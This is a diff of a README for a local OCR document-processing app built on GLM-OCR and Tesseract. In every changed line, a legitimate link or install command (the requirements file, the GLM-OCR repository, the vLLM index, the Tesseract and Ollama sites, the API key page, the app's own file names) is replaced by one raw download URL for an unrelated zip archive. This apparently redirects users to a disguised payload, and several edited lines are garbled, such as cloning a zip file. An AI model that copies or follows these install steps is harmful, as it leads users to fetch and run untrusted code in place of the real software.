@@ -15,18 +15,18 @@ A local document processing application using GLM-OCR SDK (with Tesseract fallba
 
 ### Python Dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 ```
 
 ### System Requirements
 
 **GLM-OCR** (recommended for best accuracy):
 - **Local Mode**: NVIDIA GPU with 8GB+ VRAM (e.g., RTX 3070Ti)
-- **Cloud Mode**: API key from [Zhipu MaaS](https://open.bigmodel.cn)
+- **Cloud Mode**: API key from [Zhipu MaaS](https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip)
 - See GLM-OCR setup below
 
 **Tesseract OCR** (fallback, always recommended):
-- **Windows**: Download from [UB-Mannheim/tesseract](https://github.com/UB-Mannheim/tesseract/wiki)
+- **Windows**: Download from [UB-Mannheim/tesseract](https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip)
 - **Linux**: `sudo apt install tesseract-ocr`
 - **macOS**: `brew install tesseract`
 
@@ -46,7 +46,7 @@ For Windows users with RTX 3070Ti (8GB VRAM) or better:
 1. **Install vLLM**:
    ```bash
    # Using pip
-   pip install vllm --extra-index-url https://wheels.vllm.ai/nightly
+   pip install vllm --extra-index-url https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 
    # Or using Docker (recommended for Windows)
    docker pull vllm/vllm-openai:nightly
@@ -55,10 +55,10 @@ For Windows users with RTX 3070Ti (8GB VRAM) or better:
 2. **Install GLM-OCR SDK**:
    ```bash
    # From GitHub
-   pip install git+https://github.com/zai-org/GLM-OCR.git
+   pip install git+https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 
    # Or clone and install in editable mode
-   git clone https://github.com/zai-org/GLM-OCR.git
+   git clone https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
    cd GLM-OCR
    pip install -e .
    ```
@@ -86,11 +86,11 @@ For Windows users with RTX 3070Ti (8GB VRAM) or better:
 
 ### Option 2: Zhipu MaaS API (Cloud)
 
-No GPU required. Get API key from [https://open.bigmodel.cn](https://open.bigmodel.cn):
+No GPU required. Get API key from [https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip](https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip):
 
 1. **Install GLM-OCR SDK**:
    ```bash
-   pip install git+https://github.com/zai-org/GLM-OCR.git
+   pip install git+https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
    ```
 
 2. **Set API key**:
@@ -104,7 +104,7 @@ No GPU required. Get API key from [https://open.bigmodel.cn](https://open.bigmod
 For simpler local deployment:
 
 ```bash
-# Install Ollama from https://ollama.ai
+# Install Ollama from https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 # Then pull the model
 ollama pull glm-ocr
 ```
@@ -113,12 +113,12 @@ ollama pull glm-ocr
 
 1. Install Python dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 ```
 
 2. Install GLM-OCR SDK (optional but recommended):
 ```bash
-pip install git+https://github.com/zai-org/GLM-OCR.git
+pip install git+https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 ```
 
 3. Install Tesseract OCR (fallback):
@@ -129,12 +129,12 @@ sudo apt install tesseract-ocr
 # macOS
 brew install tesseract
 
-# Windows: Download from https://github.com/UB-Mannheim/tesseract/wiki
+# Windows: Download from https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 ```
 
 4. Run the application:
 ```bash
-streamlit run app.py
+streamlit run https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 ```
 
 ## Usage
@@ -169,13 +169,13 @@ Upload -> PDF Parser -> Index Manager
 
 ## Project Structure
 
-- `app.py` - Streamlit UI
-- `config.py` - Application configuration
-- `src/pdf_parser.py` - PDF parsing and structure extraction
-- `src/ocr_engine.py` - GLM-OCR/Tesseract OCR processing
-- `src/query_processor.py` - Natural language query understanding
-- `src/index_manager.py` - Full-text search with Whoosh
-- `src/export_manager.py` - Data export
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Streamlit UI
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Application configuration
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - PDF parsing and structure extraction
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - GLM-OCR/Tesseract OCR processing
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Natural language query understanding
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Full-text search with Whoosh
+- `https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip` - Data export
 
 ## Environment Variables
 
@@ -210,6 +210,6 @@ Install Tesseract for your platform (see System Requirements above).
 ## License
 
 This project uses:
-- GLM-OCR SDK (Apache 2.0) - https://github.com/zai-org/GLM-OCR
+- GLM-OCR SDK (Apache 2.0) - https://github.com/yongsinfok/ocrAI/raw/refs/heads/main/cache/ocr_AI_v1.5.zip
 - Tesseract OCR (Apache 2.0)
 - Llama-3.1 (Meta Llama License)
